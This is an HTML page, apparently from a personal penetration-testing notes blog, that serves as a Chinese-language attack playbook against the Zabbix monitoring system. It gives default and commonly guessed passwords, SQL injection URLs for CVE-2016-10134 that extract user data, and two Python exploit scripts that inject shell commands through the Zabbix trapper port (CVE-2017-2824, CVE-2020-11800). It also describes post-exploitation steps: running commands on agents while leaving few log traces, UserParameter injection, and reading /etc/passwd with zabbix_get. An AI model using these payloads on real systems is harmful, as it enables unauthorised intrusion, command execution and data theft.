@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Zabbix - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Zabbix", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+          ]},
+          {title: "\u7cfb\u7edf\u63a2\u6d4b", url: "#_2", children: [
+          ]},
+          {title: "\u53d1\u8d77\u653b\u51fb", url: "#_3", children: [
+              {title: "\u9ed8\u8ba4\u5bc6\u7801", url: "#_4" },
+              {title: "CVE-2022-23131", url: "#cve-2022-23131" },
+              {title: "CVE-2016-10134", url: "#cve-2016-10134" },
+              {title: "CVE-2017-2824 - \u547d\u4ee4\u6ce8\u5165", url: "#cve-2017-2824-" },
+              {title: "CVE-2020-11800 - \u547d\u4ee4\u6ce8\u5165", url: "#cve-2020-11800-" },
+          ]},
+          {title: "\u540e\u6e17\u900f", url: "#_5", children: [
+              {title: "EnableRemoteCommands \u53c2\u6570\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c", url: "#enableremotecommands" },
+              {title: "UserParameter \u81ea\u5b9a\u4e49\u53c2\u6570\u547d\u4ee4\u6ce8\u5165", url: "#userparameter" },
+              {title: "\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6", url: "#_6" },
+          ]},
+          {title: "ref", url: "#ref", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../cpanel/cpanel/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../cpanel/cpanel/" class="btn btn-xs btn-link">
+        cpanel
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../X11/X11/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../X11/X11/" class="btn btn-xs btn-link">
+        X11
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="zabbix">Zabbix</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#系统探测">系统探测</a></li>
+<li><a href="#发起攻击">发起攻击</a><ul>
+<li><a href="#默认密码">默认密码</a></li>
+<li><a href="#CVE-2022-23131">CVE-2022-23131</a></li>
+<li><a href="#CVE-2016-10134">CVE-2016-10134</a></li>
+<li><a href="#CVE-2017-2824---命令注入">CVE-2017-2824 - 命令注入</a></li>
+<li><a href="#CVE-2020-11800---命令注入">CVE-2020-11800 - 命令注入</a></li>
+</ul>
+</li>
+<li><a href="#后渗透">后渗透</a><ul>
+<li><a href="#EnableRemoteCommands-参数远程命令执行">EnableRemoteCommands 参数远程命令执行</a><ul>
+<li><a href="#zabbix_get">zabbix_get</a></li>
+</ul>
+</li>
+<li><a href="#UserParameter-自定义参数命令注入">UserParameter 自定义参数命令注入</a></li>
+<li><a href="#任意文件读取">任意文件读取</a></li>
+</ul>
+</li>
+<li><a href="#ref">ref</a></li>
+</ul>
+<p>Zabbix是一个设备监控器，监控各个服务器的状态</p>
+<p><img alt="" src="../image/image_XErLTFHCiU.png" /></p>
+<p>常见架构，server是监控端，agent是被监控端</p>
+<p><img alt="" src="../image/image_wmeIG4QQWV.png" /></p>
+<p>若需要大规模监控，则可以用如下模式</p>
+<p><img alt="" src="../image/image_nFKZa53QQW.png" /></p>
+<h1 id="_2">系统探测</h1>
+<h1 id="_3">发起攻击</h1>
+<h2 id="_4">默认密码</h2>
+<p>· 超级管理员默认账号：Admin，密码：zabbix &#x20;
+· Guests用户，账号：guest，密码为空</p>
+<p>· Mysql弱口令</p>
+<p>除了默认root用户无法外连之外，运维通常会新建MySQL用户 <code>zabbix</code>，根据用户习惯梳理了<code>zabbix</code>用户的常见密码：</p>
+<pre><code class="language-纯文本">123456
+
+zabbix
+
+zabbix123
+
+zabbix1234
+
+zabbix12345
+
+zabbix123456
+</code></pre>
+<h2 id="cve-2022-23131">CVE-2022-23131</h2>
+<p>登录绕过</p>
+<ul>
+<li>5.4.0-5.4.8</li>
+<li>6.0.0alpha1</li>
+</ul>
+<p><a href="https://github.com/Mr-xn/cve-2022-23131" title="https://github.com/Mr-xn/cve-2022-23131">https://github.com/Mr-xn/cve-2022-23131</a></p>
+<h2 id="cve-2016-10134">CVE-2016-10134</h2>
+<p>Zabbix 2.2.14之前的版本和3.0.4之前的3.0版本中存在SQL注入漏洞</p>
+<p>访客登录&#x20;
+&#x20;登录后，查看Cookie中的zbx_sessionid，复制后16位字符</p>
+<p>将这16个字符作为sid的值，访问   </p>
+<pre><code class="language-纯文本">http://192.168.92.132:8080 /latest.php?output=ajax&amp;sid= sid值&amp;favobj=toggle&amp;toggle_open_state=1&amp;toggle_ids[]=updatexml(0,concat(0xa,user()),0)
+</code></pre>
+<p>payload2，这个payload无需登录</p>
+<pre><code class="language-纯文本">http://192.168.92.132:8080/jsrpc.php?sid=0bcd4ade648214dc&amp;type=9&amp;method=screen.get&amp;timestamp=1471403798083&amp;mode=2&amp;screenid=&amp;groupid=&amp;hostid=0&amp;pageFile=history.php&amp;profileIdx=web.item.graph&amp;profileIdx2=profileldx2=(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(0x7e,name,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)&amp;updateProfile=true&amp;screenitemid=&amp;period=3600&amp;stime=20160817050632&amp;resourcetype=17
+</code></pre>
+<h2 id="cve-2017-2824-">CVE-2017-2824 - 命令注入</h2>
+<p>前提：开启自动注册</p>
+<p><img alt="" src="../image/image_9RG17LFCpN.png" /></p>
+<p>exp</p>
+<pre><code class="language-纯文本">import sys
+import socket
+import json
+import sys
+
+
+def send(ip, data):
+    conn = socket.create_connection((ip, 10051), 10)
+    conn.send(json.dumps(data).encode())
+    data = conn.recv(2048)
+    conn.close()
+    return data
+
+
+target = sys.argv[1]
+print(send(target, {&quot;request&quot;:&quot;active checks&quot;,&quot;host&quot;:&quot;vulhub&quot;,&quot;ip&quot;:&quot;;touch /tmp/success&quot;}))
+for i in range(10000, 10500):
+    data = send(target, {&quot;request&quot;:&quot;command&quot;,&quot;scriptid&quot;:1,&quot;hostid&quot;:str(i)})
+    if data and b'failed' not in data:
+        print('hostid: %d' % i)
+        print(data)
+</code></pre>
+<h2 id="cve-2020-11800-">CVE-2020-11800 - 命令注入</h2>
+<p>该漏洞为基于 CVE-2017-2824 的绕过利用。未授权攻击者向 Zabbix Server 的 10051 端口发送 trapper 功能相关命令，利用漏洞即可在 Zabbix Server 上执行系统命令。</p>
+<p>其中 CVE-2020-11800 漏洞通过 ipv6 格式绕过 ip 字段检测注入执行 shell 命令，<strong>受数据表字段限制 Payload 长度只能为 64 个字符</strong>。</p>
+<pre><code class="language-纯文本">{&quot;request&quot;:&quot;active checks&quot;,&quot;host&quot;:&quot;vulhub&quot;,&quot;ip&quot;:&quot;ffff:::;whoami&quot;}
+
+</code></pre>
+<p>exp</p>
+<pre><code class="language-纯文本">import sys
+import socket
+import json
+import sys
+
+
+def send(ip, data):
+    conn = socket.create_connection((ip, 10051), 10)
+    conn.send(json.dumps(data).encode())
+    data = conn.recv(2048)
+    conn.close()
+    return data
+
+
+target = sys.argv[1]
+print(send(target, {&quot;request&quot;:&quot;active checks&quot;,&quot;host&quot;:&quot;vulhub&quot;,&quot;ip&quot;:&quot;ffff:::;whoami&quot;}))
+for i in range(10000, 10500):
+    data = send(target, {&quot;request&quot;:&quot;command&quot;,&quot;scriptid&quot;:1,&quot;hostid&quot;:str(i)})
+    if data and b'failed' not in data:
+        print('hostid: %d' % i)
+        print(data)
+</code></pre>
+<h1 id="_5">后渗透</h1>
+<h2 id="enableremotecommands">EnableRemoteCommands 参数远程命令执行</h2>
+<p>在agent上执行命令需要在<code>zabbix_agentd.conf</code>配置文件中开启EnableRemoteCommands参数，在server上执行命令就不用。</p>
+<p>如果要指定某个agent执行该脚本，可从Zabbix Web的“监测中 -&gt; 最新数据”功能中根据过滤条件找到想要执行脚本的主机，单击主机名即可在对应Agent上执行脚本。</p>
+<p><strong>这里有个常见误区，如果类型是“执行在Zabbix服务器”，无论选择哪台主机执行脚本，最终都是执行在Zabbix Server上。</strong></p>
+<p><img alt="" src="../image/image_RozrAXlypA.png" /></p>
+<p><img alt="" src="../image/image_vAA2-IZaCW.png" /></p>
+<p><img alt="" src="../image/image_sEG0ncrU8J.png" /></p>
+<h4 id="zabbix_get">zabbix_get</h4>
+<p>如果不想在Zabbix Web上留下太多日志痕迹，或者想批量控制Agent，拿下Zabbix Server权限后可以通过zabbix_get命令向Agent执行监控项命令，<strong>在Zabbix Web执行脚本实际上等于执行system.run监控项命令</strong>。</p>
+<p>也可以基于Zabbix Server作为隧道跳板，在本地执行zabbix_get命令也能达到同样效果（Zabbix Agent为IP白名单校验）。</p>
+<p><img alt="" src="../image/image_y1sh-lD4GG.png" /></p>
+<h2 id="userparameter">UserParameter 自定义参数命令注入</h2>
+<p>执行监控项时UserParameter参数command命令的\$1、\$2等会被替换成item传参值，存在命令注入的风险，但默认受UnsafeUserParameters参数限制无法传入特殊字符。</p>
+<p>当Zabbiax Agent的<code>zabbix_agentd.conf</code>配置文件开启UnsafeUserParameters参数的情况下，传参值字符不受限制，只需要找到存在传参的自定义参数UserParameter，就能达到命令注入的效果。（也就是说，看脸）</p>
+<p>内网渗透时候留意agent上的配置文件，并在其他机器上进行复用</p>
+<pre><code class="language-纯文本">Zabbix Agent的配置文件zabbix_agentd.conf通常位于以下位置之一：
+
+- Linux系统：/etc/zabbix/zabbix_agentd.conf
+- Windows系统：C:\Program Files\Zabbix Agent\zabbix_agentd.conf
+</code></pre>
+<p><img alt="" src="../image/image_ZYc1QbhnTB.png" /></p>
+<h2 id="_6">任意文件读取</h2>
+<pre><code class="language-纯文本">zabbix_get -s 172.19.0.5 -p 10050 -k &quot;vfs.file.contents[/etc/passwd]&quot;
+
+</code></pre>
+<h1 id="ref">ref</h1>
+<p><a href="https://blog.noah.360.net/zabbixgong-ji-mian-wa-jue-yu-li-yong/" title="https://blog.noah.360.net/zabbixgong-ji-mian-wa-jue-yu-li-yong/">https://blog.noah.360.net/zabbixgong-ji-mian-wa-jue-yu-li-yong/</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../cpanel/cpanel/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../cpanel/cpanel/" class="btn btn-xs btn-link">
+        cpanel
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../X11/X11/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../X11/X11/" class="btn btn-xs btn-link">
+        X11
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
